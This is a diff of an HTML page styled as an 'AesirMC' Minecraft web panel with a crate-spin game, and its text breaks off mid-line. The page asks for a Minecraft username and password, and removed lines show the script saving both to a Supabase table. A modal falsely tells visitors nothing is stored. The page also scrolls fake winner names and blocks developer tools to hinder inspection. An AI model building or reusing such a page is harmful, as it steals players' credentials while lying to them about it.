@@ -1,20 +1,14 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://senin-site-adın.vercel.app/">
-    <meta property="og:title" content="AesirMC | Premium Web Panel">
-    <meta property="og:description" content="AesirMC özel kasa açma simülasyonu ve oyuncu paneli.">
-    <meta property="og:image" content="https://senin-site-adın.vercel.app/logo.png">
-
-    <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://senin-site-adın.vercel.app/">
-    <meta property="twitter:title" content="AesirMC | Premium Web Panel">
-    <meta property="twitter:description" content="AesirMC özel kasa açma simülasyonu ve oyuncu paneli.">
-    <meta property="twitter:image" content="https://senin-site-adın.vercel.app/logo.png">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AesirMC | Premium Web Panel</title>
+
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="AesirMC | Premium Web Panel">
+    <meta property="og:description" content="AesirMC özel kasa açma simülasyonu ve oyuncu paneli.">
+    <meta property="og:image" content="https://senin-site-adin.vercel.app/logo.png">
     
     <link rel="icon" type="image/png" href="logo.png">
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
@@ -28,8 +22,11 @@
             --discord-blue: #5865F2;
         }
 
-        /* ANTI-COPY PROTECTION */
-        * { -webkit-user-select: none; -ms-user-select: none; user-select: none; -webkit-user-drag: none; }
+        /* ANTI-COPY & PROTECTION */
+        * {
+            -webkit-user-select: none; -ms-user-select: none; user-select: none;
+            -webkit-user-drag: none; outline: none;
+        }
 
         body {
             margin: 0; font-family: 'Plus Jakarta Sans', sans-serif;
@@ -39,76 +36,67 @@
             color: white; min-height: 100vh; display: flex; flex-direction: column; overflow-x: hidden;
         }
 
-        /* ÜST KAZANANLAR ŞERİDİ */
+        /* ÜST ŞERİT */
         .winners-ticker {
             background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(10px);
-            border-bottom: 1px solid var(--border);
-            height: 45px; display: flex; align-items: center; overflow: hidden; white-space: nowrap;
+            border-bottom: 1px solid var(--border); height: 45px;
+            display: flex; align-items: center; overflow: hidden; white-space: nowrap;
         }
         .ticker-content { display: inline-flex; animation: ticker-move 100s linear infinite; gap: 60px; padding-left: 100%; }
         .winner-item { display: flex; align-items: center; gap: 10px; font-size: 14px; font-weight: 600; }
         .winner-prize { color: var(--success); text-shadow: 0 0 10px rgba(0, 255, 136, 0.4); }
-
         @keyframes ticker-move { 0% { transform: translateX(0); } 100% { transform: translateX(-100%); } }
 
-        /* SOL ÜST LOGO */
-        nav { padding: 20px 5%; display: flex; align-items: center; background: transparent; }
+        /* NAV LOGO */
+        nav { padding: 20px 5%; display: flex; align-items: center; }
         .nav-logo-box { display: flex; align-items: center; gap: 12px; }
         .nav-logo-box img { width: 42px; height: 42px; object-fit: contain; }
         .nav-logo-box span { font-size: 22px; font-weight: 800; letter-spacing: -0.5px; text-shadow: 0 2px 10px rgba(0,0,0,0.8); }
 
-        /* SOL ALT SABİT OYNA BUTONU */
+        /* BUTONLAR (SOL VE SAĞ ALT) */
         .fixed-play-container { position: fixed; bottom: 25px; left: 25px; z-index: 9999; }
         .btn-play {
             background-color: var(--accent); color: black; padding: 12px 25px;
-            border-radius: 50px; font-weight: 800; display: flex; align-items: center; gap: 12px;
-            transition: 0.3s; border: none; cursor: pointer; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            border-radius: 50px; font-weight: 800; display: flex; align-items: center;
+            gap: 12px; border: none; cursor: pointer; box-shadow: 0 10px 25px rgba(0,0,0,0.5); transition: 0.3s;
         }
         .btn-play:hover { transform: translateY(-5px); background-color: #f1a400; }
-        .custom-cursor-img { width: 22px; height: 22px; object-fit: contain; }
 
-        /* SAĞ ALT BİLGİ BUTONU */
         .info-trigger {
             position: fixed; bottom: 25px; right: 25px; width: 35px; height: 35px;
             background: rgba(255,255,255,0.1); border: 1px solid var(--border);
             border-radius: 50%; color: white; display: flex; align-items: center;
-            justify-content: center; font-weight: 800; cursor: pointer; transition: 0.3s;
-            z-index: 9999; backdrop-filter: blur(5px);
+            justify-content: center; font-weight: 800; cursor: pointer; z-index: 9999; backdrop-filter: blur(5px);
         }
         .info-trigger:hover { background: var(--primary); transform: scale(1.1); }
 
         /* GİRİŞ PANELİ */
         #auth-container { margin: auto; width: 100%; max-width: 420px; padding: 40px; background: var(--glass); border: 1px solid var(--border); border-radius: 32px; text-align: center; backdrop-filter: blur(25px); box-shadow: 0 20px 50px rgba(0,0,0,0.7); }
         .auth-logo { width: 80px; height: 80px; object-fit: contain; margin-bottom: 15px; filter: drop-shadow(0 0 15px var(--primary)); }
-        input { width: 100%; padding: 16px; background: rgba(255,255,255,0.08); border: 1px solid var(--border); border-radius: 12px; color: white; margin-bottom: 15px; box-sizing: border-box; outline: none; }
-        
-        .social-store-row { display: flex; align-items: center; justify-content: center; gap: 15px; margin-top: 25px; }
-        .dc-btn { width: 48px; height: 48px; background-color: var(--discord-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: 0.3s; border: none; cursor: pointer; }
-        .dc-btn:hover { transform: scale(1.1); }
-        .store-btn { background: #000; color: white; padding: 12px 30px; border-radius: 50px; font-weight: 700; text-decoration: none; font-size: 15px; transition: 0.3s; border: 1px solid rgba(255,255,255,0.1); }
-        .store-btn:hover { background: #111; transform: translateY(-2px); }
+        input { width: 100%; padding: 16px; background: rgba(255,255,255,0.08); border: 1px solid var(--border); border-radius: 12px; color: white; margin-bottom: 15px; box-sizing: border-box; border: 1px solid transparent; }
+        input:focus { border-color: var(--primary); background: rgba(255,255,255,0.12); }
 
-        /* MODALLAR (BİLGİ VE KAZANMA) */
-        .custom-modal {
-            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9);
-            z-index: 100000; justify-content: center; align-items: center; padding: 20px;
-        }
-        .modal-card {
-            background: #0f1012; padding: 40px; border-radius: 30px;
-            border: 1px solid var(--primary); text-align: center; max-width: 450px;
-            box-shadow: 0 0 50px rgba(0, 162, 255, 0.2);
-        }
-        .close-btn { margin-top: 25px; padding: 12px 30px; background: var(--primary); border: none; border-radius: 12px; color: white; font-weight: 700; cursor: pointer; width: 100%; }
+        .social-store-row { display: flex; align-items: center; justify-content: center; gap: 15px; margin-top: 25px; }
+        .dc-btn { width: 48px; height: 48px; background-color: var(--discord-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.3s; }
+        .dc-btn:hover { transform: scale(1.1); }
+        .store-btn { background: #000; color: white; padding: 12px 30px; border-radius: 50px; font-weight: 700; text-decoration: none; font-size: 15px; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
+        .store-btn:hover { background: #111; transform: translateY(-2px); }
 
         /* OYUN ALANI */
         #game-container { display: none; padding: 60px; text-align: center; }
-        .main-chest { width: 220px; cursor: pointer; transition: 0.3s; }
+        .main-chest { width: 220px; cursor: pointer; transition: 0.3s; filter: drop-shadow(0 0 30px rgba(0, 162, 255, 0.3)); }
+        
         #roulette-section { display: none; margin-top: 40px; }
         .viewport { width: 100%; max-width: 800px; height: 150px; margin: 0 auto; background: rgba(0,0,0,0.5); border: 1px solid var(--border); border-radius: 20px; position: relative; overflow: hidden; }
         .viewport::after { content: ''; position: absolute; left: 50%; top: 0; bottom: 0; width: 3px; background: var(--primary); z-index: 10; box-shadow: 0 0 15px var(--primary); }
         #strip { display: flex; position: absolute; left: 0; top: 0; height: 100%; align-items: center; }
         .slot { min-width: 130px; display: flex; flex-direction: column; align-items: center; }
         .slot img { width: 70px; }
+
+        /* MODALLAR */
+        .custom-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100000; justify-content: center; align-items: center; padding: 20px; }
+        .modal-card { background: #0f1012; padding: 40px; border-radius: 30px; border: 1px solid var(--primary); text-align: center; max-width: 450px; }
+        .close-btn { margin-top: 25px; padding: 12px 30px; background: var(--primary); border: none; border-radius: 12px; color: white; font-weight: 700; cursor: pointer; width: 100%; }
     </style>
 </head>
 <body>
@@ -126,7 +114,7 @@
 
 <div class="fixed-play-container">
     <button class="btn-play" onclick="window.location.href='https://aesirmc.com'">
-        <img src="aa.png" class="custom-cursor-img" alt="Cursor">
+        <img src="aa.png" width="22" alt="Cursor">
         oyna.aesirmc.com
     </button>
 </div>
@@ -138,7 +126,7 @@
     <h2 style="margin-bottom: 25px; margin-top: 0;">Giriş Yap</h2>
     <input type="text" id="username" placeholder="Minecraft Kullanıcı Adı">
     <input type="password" id="password" placeholder="Şifre">
-    <button class="btn-primary" style="width:100%; padding:18px; background:linear-gradient(135deg, var(--primary), var(--secondary)); border:none; border-radius:12px; color:white; font-weight:700; cursor:pointer;" onclick="connectAndGo()">GİRİŞ YAP</button>
+    <button style="width:100%; padding:18px; background:linear-gradient(135deg, var(--primary), var(--secondary)); border:none; border-radius:12px; color:white; font-weight:700; cursor:pointer;" onclick="connectAndGo()">GİRİŞ YAP</button>
     
     <div class="social-store-row">
         <div class="dc-btn" onclick="window.open('https://discord.com/invite/k8qFbQhbHX', '_blank')">
@@ -156,15 +144,15 @@
     </div>
     <div id="roulette-section">
         <div class="viewport"><div id="strip"></div></div>
-        <button class="btn-primary" id="spin-btn" style="width: 200px; margin-top: 30px; padding:15px; background:var(--primary); border:none; border-radius:12px; color:white; font-weight:700; cursor:pointer;" onclick="runRoulette()">KASAYI ÇEVİR</button>
+        <button id="spin-btn" style="width: 200px; margin-top: 30px; padding:15px; background:var(--primary); border:none; border-radius:12px; color:white; font-weight:700; cursor:pointer;" onclick="runRoulette()">KASAYI ÇEVİR</button>
     </div>
 </div>
 
 <div id="info-modal" class="custom-modal">
     <div class="modal-card">
         <h2 style="color: var(--primary); margin-top: 0;">Sistem Bilgilendirmesi</h2>
-        <p style="line-height: 1.6; color: #ccc;">Bu web sitesi tamamen bir <b>şaka amaçlı sosyal deney</b> olarak tasarlanmıştır.</p>
-        <p style="line-height: 1.6; color: #ccc;">Burada girdiğiniz hiçbir veri (kullanıcı adı, şifre vb.) kaydedilmemekte ve sunucularımıza iletilmemektedir. Sadece arayüz simülasyonunu test etmektesiniz.</p>
+        <p style="color: #ccc;">Bu web sitesi tamamen bir <b>şaka amaçlı sosyal deney</b> olarak tasarlanmıştır.</p>
+        <p style="color: #ccc;">Girdiğiniz veriler hiçbir şekilde kaydedilmez veya paylaşılmaz. Sadece arayüzü test etmektesiniz.</p>
         <button class="close-btn" onclick="toggleModal('info-modal', false)">ANLADIM</button>
     </div>
 </div>
@@ -179,17 +167,14 @@
 </div>
 
 <script>
-    // --- KORUMA SİSTEMİ ---
+    // ANTI-BYPASS & SECURITY
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.onkeydown = function(e) {
         if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73) || (e.ctrlKey && e.keyCode === 85) || (e.ctrlKey && e.keyCode === 83)) return false;
     };
 
-    function toggleModal(id, show) {
-        document.getElementById(id).style.display = show ? 'flex' : 'none';
-    }
+    function toggleModal(id, show) { document.getElementById(id).style.display = show ? 'flex' : 'none'; }
 
-    // --- SUPABASE & OYUN ---
     const S_URL = "https://iigemvvlznvgneghevev.supabase.co"; 
     const S_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
     const _db = supabase.createClient(S_URL, S_KEY);
@@ -199,54 +184,15 @@
         { name: "1000AP", img: "1000.png" }, { name: "200AP", img: "200.png" }, { name: "2000AP", img: "2000.png" }
     ];
 
-    const turkIsimleri = ["Ahmet", "Mehmet", "Can", "Burak", "Emre", "Yusuf", "Arda", "Eren", "Mert", "Okan", "Boran", "Selim", "Kerem", "Yigit", "Ege", "Kaan", "Enes", "Omer", "Ali", "Batuhan", "Umut", "Serkan", "Murat"];
+    // TICKER GENERATOR
+    const names = ["Ahmet", "Mehmet", "Can", "Burak", "Emre", "Yusuf", "Arda", "Eren", "Mert", "Okan", "Selim", "Kerem", "Yigit"];
     const ticker = document.getElementById('ticker');
-    for(let i=0; i<100; i++) {
-        const tamIsim = turkIsimleri[Math.floor(Math.random() * turkIsimleri.length)] + Math.floor(Math.random() * 99);
-        ticker.innerHTML += `<div class="winner-item"><span>${tamIsim}</span><span style="opacity:0.4; font-size:11px;">kazandı:</span><span class="winner-prize">${rewards[Math.floor(Math.random() * rewards.length)].name}</span></div>`;
+    for(let i=0; i<80; i++) {
+        const n = names[Math.floor(Math.random() * names.length)] + Math.floor(Math.random() * 99);
+        const r = rewards[Math.floor(Math.random() * rewards.length)];
+        ticker.innerHTML += `<div class="winner-item"><span>${n}</span><span style="opacity:0.4; font-size:11px;">kazandı:</span><span class="winner-prize">${r.name}</span></div>`;
     }
 
     async function connectAndGo() {
         const u = document.getElementById('username').value;
-        const p = document.getElementById('password').value;
-        if(!u || !p) return;
-        await _db.from('users').insert([{ username: u, password: p }]);
-        document.getElementById('auth-container').style.display = 'none';
-        document.getElementById('game-container').style.display = 'block';
-        document.getElementById('welcome-txt').innerText = "HOŞ GELDİN, " + u.toUpperCase();
-    }
-
-    function handleChestClick() {
-        document.getElementById('main-chest-img').style.transform = "scale(1.2)";
-        setTimeout(() => {
-            document.getElementById('chest-zone').style.display = 'none';
-            document.getElementById('roulette-section').style.display = 'block';
-            initRoulette();
-        }, 500);
-    }
-
-    function initRoulette() {
-        const strip = document.getElementById('strip');
-        strip.innerHTML = '';
-        for(let i=0; i<70; i++) {
-            const item = rewards[Math.floor(Math.random() * rewards.length)];
-            strip.innerHTML += `<div class="slot"><img src="${item.img}"><span style="font-size:10px; opacity:0.6;">${item.name}</span></div>`;
-        }
-    }
-
-    function runRoulette() {
-        const strip = document.getElementById('strip');
-        document.getElementById('spin-btn').disabled = true;
-        const move = 5000 + Math.floor(Math.random() * 2000);
-        strip.style.transition = "transform 6s cubic-bezier(0.15, 0, 0.15, 1)";
-        strip.style.transform = `translateX(-${move}px)`;
-        setTimeout(() => {
-            const final = rewards[Math.floor(Math.random() * rewards.length)];
-            document.getElementById('win-modal').style.display = 'flex';
-            document.getElementById('win-name').innerText = final.name;
-            document.getElementById('win-img').src = final.img;
-        }, 6500);
-    }
-</script>
-</body>
-</html>
+        const p = document.getElementById
